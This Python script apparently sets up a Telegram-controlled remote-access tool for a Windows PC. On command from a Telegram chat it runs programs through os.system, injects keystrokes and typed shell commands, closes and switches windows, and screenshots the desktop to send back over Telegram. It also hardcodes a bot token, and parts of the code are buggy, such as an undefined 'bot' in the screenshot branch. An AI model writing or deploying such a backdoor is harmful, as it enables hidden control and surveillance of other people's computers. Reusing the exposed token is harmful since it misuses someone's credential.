from telegram import Bot
from os import system,getenv
from PIL import ImageGrab
from keyboard import write,press_and_release
import threading
threading.TIMEOUT_MAX = pow(10,14)


class teleniyamaka():
    def __init__(self):
        self.bot = Bot(token='1377167894:AAGIgF39TUG6NXtgcfGKFf-o5TGkKsY5ESw')
        self.cname = getenv('COMPUTERNAME')
        self.tomessage = "Sorry boss , I couldn't do from query, because "+self.cname+" went offline."
        self.latest = self.bot.get_updates()[-1]
        self.connected = False
        self.islatest = False
        self.use = None
    def start(self):
        t1 = threading.Thread(target=teleniyamaka.isonline, args=(self,))
        t2 = threading.Thread(target=teleniyamaka.checklatest, args=(self,))
        t3 = threading.Thread(target=teleniyamaka.checkuse, args=(self,))
        t1.start()
        t2.start()
        t3.start()
        teleniyamaka.isconnected(self)
        while True:
            while self.isconnected:
                if self.islatest:
                    if self.use:
                        query = self.use+" "+self.latest.message.text.strip()

                    else:
                        query = self.latest.message.text.strip()

                    teleniyamaka.action(self,query)
                    
        
        pass
    def isconnected(self):
        while True:
            if self.latest.message.text.strip() == 'connect '+self.cname and self.islatest==True:
                t = self.cname+' connected'
                self.bot.send_message(chat_id=self.latest.message.chat_id,text=t)
                self.isconnected = True
                self.islatest=False
                break
                
    def isonline(self):
        while True:
            if self.latest.message.text.strip() == 'online' and self.islatest==True:
                try:
                    self.bot.send_message(chat_id=self.latest.message.chat_id,text=self.cname)
                except:
                    pass
            self.islatest=False
    def checklatest(self):
        while True:
            if self.islatest == False:
                l = self.bot.get_updates()[-1]
                if self.latest.update_id != l.update_id:
                    print(l.message.text)
                    self.latest = l
                    self.islatest = True
    def checkuse(self):
        while True:
            if self.latest.message.text.strip().split(" ")[0] == 'use' and self.islatest==True:
                self.use = self.latest.message.text.strip().split(" ")[1]
                self.islatest=False
                print(self.use)
            elif self.latest.message.text.strip().split(" ")[0] == 'unuse' and self.islatest==True:
                self.use = None
                self.islatest=False
    def action(self,query):
        q = query.split(" ")
        chatid = self.latest.message.chat_id
        try:
            
            if q[len(q)-1] == 'times':
                for i in range(int(q[len(q)-2])):
                    self.action(' '.join(q[:len(q)-2]))
                    self.islatest = False
            elif q[0] == 'start':
                system(q[0]+' '+q[1])
                press_and_release('alt+enter')
                self.islatest = False
            elif q[0] == 'type':
                print(query)
                write(query[5:len(query)])
                self.islatest = False
            elif q[0] == 'cmd':
                write(query[4:len(query)])
                press_and_release('enter')
                self.islatest = False
            elif q[0] == 'press':
                press_and_release(q[1])
                self.islatest = False
            elif q[0] == 'hold':
                press_and_release(q[1],do_release=False)
                self.islatest = False
            elif q[0] == 'release':
                press_and_release(q[1],do_press=False)
                self.islatest = False
            elif q[0] == 'switch':
                press_and_release('alt+tab')
                self.islatest = False
            elif q[0] == 'close':
                press_and_release('alt+f4')
                self.islatest = False
            elif q[0] == 'screen':
                f = ImageGrab.grab()
                f.save('screen.png')
                fi  = open('screen.png','rb')
                bot.send_photo(chat_id=chatid,photo=fi)
                fi.close()
                self.islatest = False
            elif q[0] == 'disconnect':
                if q[1] == self.cname:
                    t = self.cname+' '+'disconnected'
                    self.isconnected = False
                    self.bot.send_message(chat_id=chatid,text=t)
                    self.islatest = False
            else:
                self.islatest = True

        except Exception as e:
            print(e)
            

x = teleniyamaka()
x.start()